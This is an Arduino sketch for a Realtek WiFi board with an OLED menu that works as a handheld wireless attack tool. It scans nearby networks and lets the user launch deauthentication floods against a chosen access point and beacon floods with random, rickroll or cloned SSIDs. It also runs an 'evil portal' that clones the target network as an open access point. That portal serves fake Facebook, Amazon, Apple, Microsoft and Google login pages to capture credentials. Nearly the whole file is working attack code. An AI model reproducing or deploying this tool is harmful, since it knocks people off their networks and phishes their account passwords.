#include <SPI.h>
#include <Arduino.h>
#ifndef SPI_MODE0
#define SPI_MODE0 0x00
#define SPI_MODE1 0x01
#define SPI_MODE2 0x02
#define SPI_MODE3 0x03
#endif
#include <U8g2lib.h>
#include <Wire.h>
#include <vector>
#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_drv.h"
#include "debug.h"
#include "WiFi.h"
#include "dns.h"
#include <lwip/lwip_v2.0.2/src/include/lwip/priv/tcp_priv.h>

// Captive portals
#include "portals/compressed/facebook.h"
#include "portals/compressed/amazon.h"
#include "portals/compressed/apple.h"
#include "portals/compressed/microsoft.h"
#include "portals/compressed/google.h"
#include "portals/default.h"

enum portals{
  Default,
  Facebook,
  Amazon,
  Apple,
  Microsoft,
  Google
};

#define MIN(a, b) ((a) < (b) ? (a) : (b))

// Replace with your specific U8G2 constructor for your 1.3" OLED (e.g. SH1106 or SSD1306)
U8G2_SH1106_128X64_NONAME_F_HW_I2C u8g2(U8G2_R0, /* reset=*/ U8X8_PIN_NONE);

// 5-way button pins (update these to match your actual wiring)
#define BTN_UP    PA26
#define BTN_DOWN  PA25
#define BTN_LEFT  PA14
#define BTN_RIGHT PA15
#define BTN_SEL   PA13

enum MenuState { MAIN_MENU, SCANNING, WIFI_LIST, ATTACK_MENU, RUNNING_ATTACK };
MenuState currentState = MAIN_MENU;

// Attack vars
typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
  int security;
} WiFiScanResult;

std::vector<WiFiScanResult> scan_results;
std::vector<int> deauth_wifis, wifis_temp;

uint8_t deauth_bssid[6];
uint16_t deauth_reason = 2;
bool randomSSID = false, rickroll = false;
char randomString[19];
int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 149, 153, 157, 161};
int portal=0;
int localPortNew=1000;
char wpa_pass[64];
char ap_channel[4];
bool secured=false;
__u8 customMac[8]={0x00,0xE0,0x4C,0x01,0x02,0x03,0x00,0x00};
bool useCustomMac=false;
extern u8 rtw_get_band_type(void);
#define FRAMES_PER_DEAUTH 5
bool apActive = false;
int status = WL_IDLE_STATUS;
WiFiServer server(80);
// removed dup
String ssid="";
uint32_t current_num = 0;

const char* rick_roll[8] = {
      "01 Never gonna give you up",
      "02 Never gonna let you down",
      "03 Never gonna run around",
      "04 and desert you",
      "05 Never gonna make you cry",
      "06 Never gonna say goodbye",
      "07 Never gonna tell a lie",
      "08 and hurt you"
};

String generateRandomString(int len){
  String randstr = "";
  const char setchar[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  for (int i = 0; i < len; i++){
    int index = random(0,strlen(setchar));
    randstr += setchar[index];
  }
  return randstr;
}

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    if(result.ssid.length()==0)result.ssid = String("<empty>");
    result.channel = record->channel;
    result.rssi = record->signal_strength;

    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    result.security = record->security;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

// UI State vars
int selected_menu_item = 0;
int max_menu_items = 0;
int selected_wifi_index = 0;
int scroll_offset = 0;

int readButtons() {
  static unsigned long last_button_time = 0;
  if (millis() - last_button_time > 200) {
    if (digitalRead(BTN_UP) == LOW) { last_button_time = millis(); return BTN_UP; }
    if (digitalRead(BTN_DOWN) == LOW) { last_button_time = millis(); return BTN_DOWN; }
    if (digitalRead(BTN_LEFT) == LOW) { last_button_time = millis(); return BTN_LEFT; }
    if (digitalRead(BTN_RIGHT) == LOW) { last_button_time = millis(); return BTN_RIGHT; }
    if (digitalRead(BTN_SEL) == LOW) { last_button_time = millis(); return BTN_SEL; }
  }
  return 0;
}

void drawMenu() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_ncenB08_tr);

  if (currentState == MAIN_MENU) {
    const char* items[] = {"Scan Networks", "Random SSID", "Rickroll SSID", "Stop All"};
    max_menu_items = 4;
    u8g2.drawStr(0, 10, "--- Main Menu ---");
    for (int i = 0; i < max_menu_items; i++) {
      int y = 25 + (i * 12);
      if (i == selected_menu_item) {
        u8g2.drawStr(0, y, ">");
      }
      u8g2.drawStr(10, y, items[i]);
    }
  } else if (currentState == SCANNING) {
    u8g2.drawStr(0, 30, "Scanning...");
  } else if (currentState == WIFI_LIST) {
    u8g2.drawStr(0, 10, "--- Select Target ---");
    max_menu_items = scan_results.size() + 1; // +1 for "Back"

    int items_per_page = 4;
    int end_item = std::min(max_menu_items, scroll_offset + items_per_page);

    for (int i = scroll_offset; i < end_item; i++) {
      int y = 25 + ((i - scroll_offset) * 12);
      if (i == selected_menu_item) {
        u8g2.drawStr(0, y, ">");
      }
      if (i == 0) {
        u8g2.drawStr(10, y, "[Back]");
      } else {
        u8g2.drawStr(10, y, scan_results[i - 1].ssid.c_str());
      }
    }
  } else if (currentState == ATTACK_MENU) {
    const char* items[] = {"Deauth", "Evil Portal", "Beacon Flood", "Back"};
    max_menu_items = 4;
    u8g2.drawStr(0, 10, "--- Attack ---");
    for (int i = 0; i < max_menu_items; i++) {
      int y = 25 + (i * 12);
      if (i == selected_menu_item) {
        u8g2.drawStr(0, y, ">");
      }
      u8g2.drawStr(10, y, items[i]);
    }
  } else if (currentState == RUNNING_ATTACK) {
    u8g2.drawStr(0, 20, "Running Attack...");
    u8g2.drawStr(0, 40, "Press SEL to Stop");
  }

  u8g2.sendBuffer();
}

String parseRequest(String request) {
  int path_start = request.indexOf(' ') + 1;
  int path_end = request.indexOf(' ', path_start);
  return request.substring(path_start, path_end);
}

//DNS
// removed dup



bool serveBegined =false;


void createAP(char* ssid, char* channel, char* password){
  int mode;
  const char* ifname = WLAN0_NAME;
  wext_get_mode(ifname, &mode);

  Serial.print("WLAN 0 ");
  Serial.println(mode);

  ifname = WLAN1_NAME;
  wext_get_mode(ifname, &mode);
  Serial.print("WLAN 1 ");
  Serial.println(mode);


  DEBUG_SER_PRINT("CREATING AP");
  DEBUG_SER_PRINT(ssid);
  DEBUG_SER_PRINT(channel);
  while (status != WL_CONNECTED) {
    DEBUG_SER_PRINT("CREATING AP 2");
      if(strcmp(password,"")==0){
        status = WiFi.apbegin(ssid, channel, (uint8_t) 0);
      }else{
        status = WiFi.apbegin(ssid, password, channel, (uint8_t) 0);
      }
      delay(1000);
  }
  unbind_dns();
  delay(1000);

  //Creamos un nuevo servicio de dns
  start_DNS_Server();
  if(!serveBegined){
    server.begin();
    serveBegined=true;
  }
  apActive = true;
  ifname = WLAN0_NAME;
  wext_get_mode(ifname, &mode);

  Serial.print("WLAN 0 ");
  Serial.println(mode);

  ifname = WLAN1_NAME;
  wext_get_mode(ifname, &mode);
  Serial.print("WLAN 1 ");
  Serial.println(mode);
}
void createAP(char* ssid, char* channel){

  createAP(ssid, channel, "");
}
void destroyAP(){
  //udp_remove(dns_server_pcb);

  void unbind_all_udp();
  delay(500);
  WiFiClient client = server.available();
  while(client.connected()){
    DEBUG_SER_PRINT("PArando cliente");
    DEBUG_SER_PRINT(client);
    client.flush();
    client.stop();
    client = server.available();
  }
  apActive=false;
  delay(500);
  wifi_off();
  delay(500);
  WiFiDrv::wifiDriverInit();
  wifi_on(RTW_MODE_STA_AP);
  status = WL_IDLE_STATUS;
  delay(500);
  WiFi.enableConcurrent();

  WiFi.status();
  int channel;
  wifi_get_channel(&channel);



}


String makeResponse(int code, String content_type, bool compresed) {
  String response = "HTTP/1.1 " + String(code) + " OK\n";
  if(compresed)
  response += "Content-Encoding: gzip\n";
  response += "Content-Type: " + content_type + "\n";
  response += "Connection: close\n\n";
  return response;
}

void handle404(WiFiClient &client) {
  String response = makeResponse(404, "text/plain",false);
  response += "Not found!";
  client.write(response.c_str());
}


void handleRequest(WiFiClient &client,enum portals portalType,String ssid){
  const char *webPage;
  String generatedWebPage; // Hold the String object in scope
  size_t len;
  bool compresed = false;
  switch(portalType){
    case Default:
      generatedWebPage = default_web(ssid);
      webPage = generatedWebPage.c_str();
      len = generatedWebPage.length();
      break;
    case Facebook:
      webPage = (const char*)facebook;
      len = facebook_len;
      break;
    case Amazon:
      webPage = (const char*)amazon;
      len = amazon_len;
      break;
    case Apple:
      webPage = (const char *)apple;
      len = apple_len;
      break;
    case Google:
      webPage = (const char *)google;
      len = google_len;
      break;
    case Microsoft:
      webPage = (const char *)microsoft;
      len = microsoft_len;
      break;
    default:
      generatedWebPage = default_web(ssid);
      webPage = generatedWebPage.c_str();
      len = generatedWebPage.length();
  }
  Serial.print("Heap libre header:");
  Serial.println(xPortGetFreeHeapSize());
  if(webPage[0]==0x1f && webPage[1]==0x8b){
    compresed=true;
  }

  String response = makeResponse(200, "text/html", compresed);
  client.write(response.c_str());



  size_t chunkSize = 5000;

  for (size_t i = 0; i < len; i += chunkSize) {
        size_t sendSize = MIN(chunkSize, len - i);
        while(client.available()){
            client.read();
            delay(10);
            }
            Serial.print("Heap libre write:");
        Serial.println(xPortGetFreeHeapSize());
        if(client.connected()){
          client.write((const uint8_t *)(webPage + i), sendSize);
          if(client.getWriteError())return;
        }else{
          return;
        }
        delay(1);
  }

  delay(10);
   while(client.available()){
            client.read();
            delay(1);
            }
}

int scanNetworks(int miliseconds) {

  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(miliseconds);
    return 0;
  } else {
    return 1;
  }
}

void setup() {
  Serial.begin(115200);

  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_LEFT, INPUT_PULLUP);
  pinMode(BTN_RIGHT, INPUT_PULLUP);
  pinMode(BTN_SEL, INPUT_PULLUP);

  u8g2.begin();

  WiFi.enableConcurrent();
  WiFi.status();
}

void loop() {
  int button = readButtons();

  if (button == BTN_UP) {
    if (selected_menu_item > 0) selected_menu_item--;
    if (selected_menu_item < scroll_offset) scroll_offset = selected_menu_item;
  } else if (button == BTN_DOWN) {
    if (selected_menu_item < max_menu_items - 1) selected_menu_item++;
    if (selected_menu_item >= scroll_offset + 4) scroll_offset = selected_menu_item - 3;
  }

  if (button == BTN_SEL) {
    switch (currentState) {
      case MAIN_MENU:
        if (selected_menu_item == 0) {
          currentState = SCANNING;
          drawMenu(); // Draw "Scanning..."
          scanNetworks(5000);
          currentState = WIFI_LIST;
          selected_menu_item = 0;
          scroll_offset = 0;
        } else if (selected_menu_item == 1) {
          randomSSID = true;
          currentState = RUNNING_ATTACK;
        } else if (selected_menu_item == 2) {
          rickroll = true;
          currentState = RUNNING_ATTACK;
        } else if (selected_menu_item == 3) {
          deauth_wifis.clear();
          randomSSID = false;
          rickroll = false;
          ssid = "";
        }
        break;

      case WIFI_LIST:
        if (selected_menu_item == 0) {
          currentState = MAIN_MENU;
          selected_menu_item = 0;
          scroll_offset = 0;
        } else {
          selected_wifi_index = selected_menu_item - 1;
          currentState = ATTACK_MENU;
          selected_menu_item = 0;
          scroll_offset = 0;
        }
        break;

      case ATTACK_MENU:
        if (selected_menu_item == 0) { // Deauth
          deauth_wifis.push_back(selected_wifi_index);
          currentState = RUNNING_ATTACK;
        } else if (selected_menu_item == 1) { // Evil Portal
          int str_len = scan_results[selected_wifi_index].ssid.length() + 1;
          char char_array[str_len];
          scan_results[selected_wifi_index].ssid.toCharArray(char_array, str_len);
          char buffer[4];
          itoa(scan_results[selected_wifi_index].channel, buffer, 10);
          createAP(char_array, buffer);
          currentState = RUNNING_ATTACK;
        } else if (selected_menu_item == 2) { // Beacon Flood
          ssid = scan_results[selected_wifi_index].ssid;
          currentState = RUNNING_ATTACK;
        } else if (selected_menu_item == 3) { // Back
          currentState = WIFI_LIST;
          selected_menu_item = 0;
          scroll_offset = 0;
        }
        break;

      case RUNNING_ATTACK:
        // Stop attack
        if (apActive) destroyAP();
        deauth_wifis.clear();
        randomSSID = false;
        rickroll = false;
        ssid = "";
        currentState = MAIN_MENU;
        selected_menu_item = 0;
        break;

      default:
        break;
    }
  }

  drawMenu();

  // -- ATTACK EXECUTION BLOCK --
  if (deauth_wifis.size() > 0) {
    memcpy(deauth_bssid, scan_results[deauth_wifis[current_num]].bssid, 6);
    wext_set_channel(WLAN0_NAME, scan_results[deauth_wifis[current_num]].channel);
    current_num++;
    if (current_num >= deauth_wifis.size()) current_num = 0;

    for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      delay(5);
    }
    delay(50);
  }

  if (randomSSID){
    int randomIndex = random(0, 10);
    int randomChannel = allChannels[randomIndex];
    String ssid2 = generateRandomString(10);
    for(int i=0;i<6;i++){
      byte randomByte = random(0x00, 0xFF);
      snprintf(randomString + i * 3, 4, "\\x%02X", randomByte);
    }
    const char * ssid_cstr2 = ssid2.c_str();
    wext_set_channel(WLAN0_NAME,randomChannel);
    for(int x=0;x<5;x++){
      wifi_tx_beacon_frame(randomString,(void *)"\xFF\xFF\xFF\xFF\xFF\xFF",ssid_cstr2);
    }
  }

  if (rickroll){
    for (int v = 0; v < 8; v++){
      String ssid2 = rick_roll[v];
      for(int i=0;i<7;i++){
        byte randomByte = random(0x00, 0xFF);
        snprintf(randomString + i * 3, 4, "\\x%02X", randomByte);
      }
      const char * ssid_cstr2 = ssid2.c_str();
      wext_set_channel(WLAN0_NAME,v+1);
      for(int x=0;x<5;x++){
       wifi_tx_beacon_frame(randomString,(void *)"\xFF\xFF\xFF\xFF\xFF\xFF",ssid_cstr2);
      }
    }
  }

  if(ssid!=""){
    int channel = 5;
    wext_set_channel(WLAN0_NAME,channel);
    const char * ssid_cstr2 = ssid.c_str();
    for(int x=0; x<5; x++){
      wifi_tx_beacon_frame((void *)"\x00\xE0\x4C\x01\x02\x03",(void *)"\xFF\xFF\xFF\xFF\xFF\xFF",ssid_cstr2);
    }
  }


  if (apActive) {
    WiFiClient client = server.available();
    if (client) {
      String request;
      request.reserve(256);
      while (client.connected()) {
        if (client.available()) {
          char character = client.read();
          if (character == '\n') {
            while(client.available()){
            character=client.read();
            client.clearWriteError();
            delay(1);
            }
            String path = parseRequest(request);
            Serial.println(request);
            if(path.startsWith("/generate_204")||path.startsWith("/ncsi.txt")||path.startsWith("/success.html")||path.startsWith("/userinput")||path.startsWith("/login")||path.startsWith("/?")||path.equals("/")||path.startsWith("/get")){
              if (deauth_wifis.size() != 0)
                handleRequest(client, (enum portals)portal, scan_results[deauth_wifis[0]].ssid);
              else
                handleRequest(client, (enum portals)portal, "router");
          }else{
            handle404(client);
          }
          break;
          }else if(character == '%'){
            char buff[2] ;
            client.read(buff,2);
            char value = (char)strtol(buff, NULL, 16);
            if(value <= 127){
              character = value;
            }else{
              request += "%";
              request += buff[0];
              request += buff[1];
            }
          }
          request += character;
          delay(10);
        }
      }
      delay(50);
      client.stop();
    }
  }

  delay(50);
}
